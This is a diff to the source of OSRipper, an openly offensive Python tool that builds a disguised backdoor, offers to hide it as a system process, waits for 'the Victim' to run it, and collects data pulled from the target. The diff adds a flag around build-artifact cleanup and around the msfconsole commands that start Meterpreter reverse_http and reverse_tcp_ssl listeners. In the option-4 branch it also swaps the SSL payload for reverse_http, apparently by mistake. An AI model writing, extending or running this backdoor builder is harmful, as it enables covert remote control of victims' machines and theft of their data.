@@ -2,10 +2,12 @@ import os
 import socket
 import shutil
 import platform
+from urllib import response
 import requests
 import random
 from pickle import GLOBAL
 bind=0
+reps=False
 def logo():
     logo1 = """
 
@@ -165,6 +167,7 @@ def logo():
 clear = lambda: os.system('clear')
 clear()
 logo()
+
 def listen(host, port):
 
     SERVER_HOST = host
@@ -501,6 +504,8 @@ def rep_syst():
     hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (y/n): ')
     if hide == 'y':
         global name2
+        global reps
+        reps=True
         if bind == '1':
             host2='localhost'
         else:
@@ -613,17 +618,24 @@ def server():
 
 def cleanup():
     try:
-        os.remove(os.getcwd()+'/dist/ocr_or')
-        os.remove('ocr')
-        os.remove('ocr_or.py')
-        os.remove('ocr_or.spec')
-        os.remove(name2)
-        os.remove(name2+'.spec')
-        if platform.system() == 'Darwin':
-            shutil.rmtree(os.getcwd()+'/dist/ocr_or.app')
-        if platform.system() == 'Windows':
-            shutil.rmtree(os.getcwd()+'/dist/ocr_or.exe')
-        shutil.rmtree(os.getcwd()+'/dist/'+name2)
+        if reps == False:
+            os.remove(os.getcwd()+'/dist/ocr_or')
+            os.remove('ocr')
+            os.remove('ocr_or.py')
+            os.remove('ocr_or.spec')
+        if reps==True:
+            os.remove(name2)
+            os.remove(name2+'.spec')
+            os.remove(os.getcwd()+'/dist/ocr_or')
+            os.remove('ocr')
+            os.remove('ocr_or.py')
+            os.remove('ocr_or.spec')
+            if platform.system() == 'Darwin':
+                shutil.rmtree(os.getcwd()+'/dist/ocr_or.app')
+            if platform.system() == 'Windows':
+                shutil.rmtree(os.getcwd()+'/dist/ocr_or.exe')
+        if reps==True:
+            shutil.rmtree(os.getcwd()+'/dist/'+name2)
     except PermissionError:
         pass
 
@@ -662,26 +674,35 @@ if nscan == "3":
     rep_syst()
     cleanup()
     os.system('clear')
-    print('Generated in dist')
-    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
-    print('After that the listener will spawn instantly')
-    server()
-    print('wait...')
-    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
-    os.system(a)
+    if reps == True:
+        print('Generated in dist')
+        print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
+        print('After that the listener will spawn instantly')
+        server()
+        print('wait...')
+        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        os.system(a)
+    else:
+        print('wait...')
+        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        os.system(a)
 if nscan == "4":
     gen_rev_ssl_tcp()
     postgen()
     rep_syst()
     cleanup()
-    os.system('clear')
-    print('Generated in dist')
-    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
-    print('After that the listener will spawn instantly')
-    server()
-    print('wait...')
-    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
-    os.system(a)
+    if reps == True:
+        print('Generated in dist')
+        print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
+        print('After that the listener will spawn instantly')
+        server()
+        print('wait...')
+        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        os.system(a)
+    else:
+        print('wait...')
+        a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+        os.system(a)
 if nscan == '5':
     disable_defender = False
     #opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
